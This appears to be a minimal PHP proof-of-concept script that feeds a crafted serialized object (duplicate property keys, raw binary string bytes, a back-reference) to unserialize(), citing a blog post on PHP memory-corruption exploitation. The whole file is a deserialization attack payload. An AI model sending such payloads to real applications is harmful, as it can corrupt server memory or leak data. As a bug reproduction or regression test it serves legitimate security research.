<?php

// example used from: http://www.inulledmyself.com/2015/02/exploiting-memory-corruption-bugs-in_23.html

$data='O:8:"stdClass":4:{';
$data.='s:3:"123";a:10:{i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;i:5;i:6;i:6;i:7;i:7;i:8;i:8;i:9;i:9;i:10;i:10;}';
$data.='s:3:"123";i:0;';
$data.='i:0;S:17:"\00\01\00\00AAAA\00\01\01\00\01\00\0B\BC\CC";';
$data.='i:1;r:12;}';
 
var_dump(serialize(unserialize($data)));
?>